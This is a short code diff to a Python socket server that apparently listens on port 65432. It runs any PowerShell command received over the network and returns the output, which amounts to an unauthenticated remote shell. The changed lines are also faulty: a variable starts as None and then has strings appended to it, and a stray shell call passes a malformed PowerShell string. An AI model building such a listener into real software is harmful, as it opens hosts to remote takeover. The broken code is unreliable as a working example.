@@ -106,9 +106,14 @@ def start_server(port=65432):
 
                         elif splitUp[0].lower() == "powershell":
                             # Execute PowerShell command
-                            powershell_command = splitUp[1]
+                            powershell_command = None
+                            for i in range(1, len(splitUp)):
+                                powershell_command += splitUp[i]
+                            print(f"PowerShell command: {powershell_command}")    
                             print(f"Executing PowerShell command: {powershell_command}")
+
                             try:
+                                subprocess.call("C:\Windows\System32\powershell.exe + ", shell=True)
                                 result = subprocess.check_output(["powershell", "-Command", powershell_command], shell=True)
                                 conn.sendall(result)
                             except subprocess.CalledProcessError as e:
